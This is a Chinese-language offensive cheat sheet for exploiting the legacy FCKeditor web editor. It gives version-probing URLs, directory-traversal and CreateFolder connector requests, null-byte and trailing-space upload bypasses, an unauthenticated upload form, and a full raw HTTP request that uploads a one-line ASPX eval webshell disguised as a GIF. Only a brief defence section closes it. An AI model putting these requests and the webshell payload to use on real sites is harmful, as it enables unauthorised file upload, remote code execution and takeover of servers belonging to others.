# FCKeditor 编辑器漏洞利用

> n 年前的总结，但如果目标里真的还在跑 FCKeditor，这类组件依然值得优先尝试。

## 一句话理解
FCKeditor 是典型的历史富文本组件，风险集中在未授权文件管理、任意文件上传、路径遍历和组件版本老旧带来的多环境上传绕过。

## 常见危害
- 任意文件上传
- 上传 WebShell
- 遍历目录与读取上传路径
- 泄露绝对路径
- 后台无验证直接调用连接器

## 版本识别
可尝试访问：
- `/fckeditor/editor/dialog/fck_about.html`
- `/ckeditor/CHANGES.html`

确定版本后，再对应不同环境与历史漏洞利用。

## 关键参数
FCKeditor 的文件管理器和连接器是核心攻击面。

常见参数：
- `connector`：指定连接器脚本位置，如 `aspx`、`php`、`jsp`
- `type`：上传类型，如 `File`、`Image`
- `Command`：执行命令，如 `GetFoldersAndFiles`、`CreateFolder`、`FileUpload`

## 默认上传路径
常见保存位置：

```text
/UserFiles/File
/UserFiles/Image
```

是否真实落在此路径，还要看后端环境和连接器实现。

## 绝对路径与信息泄露
可尝试的路径：
- `/FCKeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php`
- `/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx`
- `/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp`

这类接口常用于：
- 探测连接器是否存在
- 获取错误信息
- 间接确认物理路径或上传路径

## 目录遍历与文件管理
目录遍历是 FCKeditor 历史版本中的高频问题。

示例：

```text
/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=../../
```

历史版本中，还可能通过 `CurrentFolder` 做进一步目录跳转或建目录操作：

```text
/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp
```

根据返回的 XML，可能枚举：
- 网站目录
- 上传地址
- 可访问文件夹

其他示例：
- `/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/`
- `/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/`

## 常见上传入口
### 1. 测试文件入口
- `FCKeditor/editor/filemanager/browser/default/connectors/test.html`
- `FCKeditor/editor/filemanager/upload/test.html`
- `FCKeditor/editor/filemanager/connectors/test.html`
- `FCKeditor/editor/filemanager/connectors/uploadtest.html`

### 2. Browser 页面入口
- `/FCKeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp`
- `/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/asp/connector.asp`

## 常见利用方式
### 1. 建立文件夹与 IIS 解析差异
历史环境下，常与 IIS 6 解析特性联动：
- 建立 `*.asp` 文件夹
- 上传图片马
- 上传畸形文件

### 2. PHP 环境任意文件上传
历史版本中，某些 PHP 连接器存在任意文件上传或类型校验缺陷：

```text
/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2Ftest.php%00.gif
```

### 3. 后台无验证
例如部分版本对 `Media` 类型控制不足，可直接上传任意文件。

示例表单：

```html
<form id="frmUpload" enctype="multipart/form-data" action="http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media" method="post">
  Upload a new file:<br>
  <input type="file" name="NewFile" size="50"/><br>
  <input id="btnUpload" type="submit" value="Upload"/>
</form>
```

### 4. 空格绕过
历史版本中，提交 `shell.aspx ` 这类带空格文件名在 Windows 环境下可能绕过限制。

### 5. 二次上传
某些版本可先通过截断或畸形命名上传，再借第二次同名上传转成可执行文件。

### 6. 截断上传
历史版本中，`%00` 截断是高频技巧之一：

```text
shell.asp%00.jpg
```

原始示例请求：

```http
POST /FCKeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Image HTTP/1.1
Host: www.**.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://**m/FCKeditor/editor/dialog/fck_image.html?ImageButton
Cookie: ASP.NET_SessionId=kh5lee5aubjpdnpezzhkf4tl; WebPlugValidateCode=7020
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------61051038624293
Content-Length: 264

-----------------------------61051038624293
Content-Disposition: form-data; name="NewFile"; filename="a11.jpg"
Content-Type: image/jpeg

gif89a
<%@ Page Language="Jscript"%><%eval(Request.Item["str"],"unsafe");%>
-----------------------------61051038624293--
```

## 实战排查思路
### 1. 先识别版本与后端环境
重点区分：
- `php`
- `aspx`
- `jsp`
- `asp`

### 2. 再找连接器
核心路径通常在：
- `browser/default/connectors/`
- `upload/`

### 3. 再验证上传、遍历和无认证问题
优先测试：
- 未授权访问
- 目录遍历
- `FileUpload`
- `CreateFolder`
- 上传后文件访问路径

## 防御要点
### 1. 彻底下线历史组件
FCKeditor 已属于高风险老组件，优先替换。

### 2. 禁用未使用连接器
删除或限制所有默认上传和浏览接口。

### 3. 上传目录禁止执行
即使发生上传，也不能被脚本解析。

### 4. 后台接口做认证与权限控制
不要把文件管理连接器暴露为匿名可访问接口。

## 速查清单
- 先识别版本，再找 `connector` 和 `browser` 路径
- 先试无认证访问，再试目录遍历和上传
- 重点关注 `CurrentFolder`、`FileUpload`、`CreateFolder`
- 结合后端环境测试 `php/aspx/jsp/asp` 利用链
- 若发现 FCKeditor，优先级应明显提高
